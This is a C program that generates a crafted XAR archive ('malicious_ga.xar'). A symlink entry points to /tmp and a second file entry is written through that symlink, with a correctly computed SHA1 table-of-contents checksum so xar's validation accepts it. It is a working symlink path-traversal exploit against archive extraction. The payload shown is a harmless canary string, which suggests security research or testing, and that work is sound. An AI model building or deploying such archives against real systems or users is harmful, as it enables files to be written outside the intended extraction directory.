/*
 * build_xar_r25.c  — malicious flat XAR with correct SHA1 checksum
 *
 * XAR heap layout after the compressed TOC:
 *   heap[0..19]  = SHA1( compressed_TOC )   ← this is what xar validates
 *   heap[20..]   = compressed file payload
 *
 * The TOC <checksum> element references offset=0, size=20 in the heap.
 * The file <data> element references offset=20 in the heap.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <zlib.h>
#include <CommonCrypto/CommonDigest.h>

#define XAR_MAGIC      0x78617221
#define XAR_CKSUM_SHA1 1

static void compress_buf(const unsigned char *in, size_t inlen,
                         unsigned char **out, size_t *outlen) {
    *outlen = compressBound(inlen) + 64;
    *out = malloc(*outlen);
    z_stream s = {0};
    deflateInit2(&s, Z_DEFAULT_COMPRESSION, Z_DEFLATED, 15, 8, Z_DEFAULT_STRATEGY);
    s.next_in  = (Bytef*)in;  s.avail_in  = (uInt)inlen;
    s.next_out = *out;        s.avail_out = (uInt)*outlen;
    deflate(&s, Z_FINISH);
    deflateEnd(&s);
    *outlen = s.total_out;
}

int main(void) {
    /* ---- 1. payload ---- */
    const char *payload_str = "XAR_SYMLINK2_GATE_A_FLAT_RUN25\n";
    const unsigned char *payload = (const unsigned char *)payload_str;
    size_t payload_len = strlen(payload_str);

    /* ---- 2. compress payload ---- */
    unsigned char *cz = NULL;
    size_t czlen = 0;
    compress_buf(payload, payload_len, &cz, &czlen);

    /* ---- 3. compute adler32 for TOC ---- */
    uLong adler_raw  = adler32(0L, payload, (uInt)payload_len);
    uLong adler_comp = adler32(0L, cz,      (uInt)czlen);

    /* ---- 4. build TOC XML ----
     *
     * Flat layout — both entries at top level (no nesting):
     *   id=1  name=link_to_tmp            type=symlink  link=/tmp
     *   id=2  name=link_to_tmp/xar_gated_canary_macos.txt  type=file
     *
     * <checksum> in TOC references heap[0..19] (the SHA1 of the compressed TOC).
     * File data for id=2 lives at heap offset 20.
     */
    char toc_xml[4096];
    int tlen = snprintf(toc_xml, sizeof(toc_xml),
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
        "<xar><toc>"
          "<checksum style=\"sha1\">"
            "<offset>0</offset><size>20</size>"
          "</checksum>"
          "<file id=\"1\">"
            "<name>link_to_tmp</name>"
            "<type>symlink</type>"
            "<link>/tmp</link>"
          "</file>"
          "<file id=\"2\">"
            "<name>link_to_tmp/xar_gated_canary_macos.txt</name>"
            "<type>file</type>"
            "<data>"
              "<offset>20</offset>"
              "<size>%zu</size>"
              "<length>%zu</length>"
              "<encoding style=\"application/x-gzip\"/>"
              "<extracted-checksum style=\"adler32\">%lu</extracted-checksum>"
              "<archived-checksum style=\"adler32\">%lu</archived-checksum>"
            "</data>"
          "</file>"
        "</toc></xar>",
        payload_len, czlen,
        (unsigned long)adler_raw, (unsigned long)adler_comp);

    if (tlen <= 0 || (size_t)tlen >= sizeof(toc_xml)) {
        fprintf(stderr, "TOC too large\n"); return 1;
    }
    size_t toc_xml_len = (size_t)tlen;

    /* ---- 5. compress TOC ---- */
    unsigned char *tocz = NULL;
    size_t toczlen = 0;
    compress_buf((const unsigned char *)toc_xml, toc_xml_len, &tocz, &toczlen);

    /* ---- 6. SHA1( compressed TOC ) → this is what xar validates ---- */
    unsigned char sha1_hash[CC_SHA1_DIGEST_LENGTH]; /* 20 bytes */
    CC_SHA1(tocz, (CC_LONG)toczlen, sha1_hash);

    /* ---- 7. XAR header (28 bytes) ---- */
    uint8_t hdr[28];
    {
        uint32_t magic    = htonl(XAR_MAGIC);
        uint16_t hdrsize  = htons(28);
        uint16_t version  = htons(1);
        uint32_t cktype   = htonl(XAR_CKSUM_SHA1);
        uint64_t toc_clen = __builtin_bswap64((uint64_t)toczlen);
        uint64_t toc_ulen = __builtin_bswap64((uint64_t)toc_xml_len);
        memcpy(hdr+ 0, &magic,   4);
        memcpy(hdr+ 4, &hdrsize, 2);
        memcpy(hdr+ 6, &version, 2);
        memcpy(hdr+ 8, &toc_clen,8);
        memcpy(hdr+16, &toc_ulen,8);
        memcpy(hdr+24, &cktype,  4);
    }

    /* ---- 8. write: hdr(28) | tocz | sha1(20) | cz ---- */
    FILE *f = fopen("malicious_ga.xar", "wb");
    if (!f) { perror("fopen"); return 1; }
    fwrite(hdr,       1, 28,      f);
    fwrite(tocz,      1, toczlen, f);
    fwrite(sha1_hash, 1, 20,      f); /* SHA1 of compressed TOC */
    fwrite(cz,        1, czlen,   f); /* compressed payload      */
    fclose(f);

    printf("[+] malicious_ga.xar: 28+%zu+20+%zu bytes\n", toczlen, czlen);
    printf("[*] SHA1(tocz): ");
    for (int i = 0; i < 20; i++) printf("%02x", sha1_hash[i]);
    printf("\n");
    printf("[*] Flat TOC: id=1 link_to_tmp->symlink->/tmp | "
           "id=2 link_to_tmp/xar_gated_canary_macos.txt->file(offset=20)\n");
    free(cz); free(tocz);
    return 0;
}
